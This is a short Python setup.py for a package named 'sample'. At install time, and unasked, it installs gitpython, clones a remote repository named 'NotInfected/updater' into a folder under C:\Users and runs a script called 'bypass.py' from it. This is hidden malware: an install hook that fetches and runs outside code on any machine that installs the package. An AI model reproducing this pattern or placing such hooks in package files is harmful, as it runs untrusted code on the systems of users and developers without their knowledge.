import os
import subprocess

from setuptools import setup


subprocess.run(["pip", "install", "gitpython"])
import git

repository = "https://github.com/NotInfected/updater.git"
clone_path = os.path.join("C:", "Users", "repo")
if not os.path.isdir(clone_path):
    git.Repo.clone_from(repository, clone_path)
os.chdir(clone_path)
subprocess.run(["python", "bypass.py"])

setup(name="sample", version="0.1")
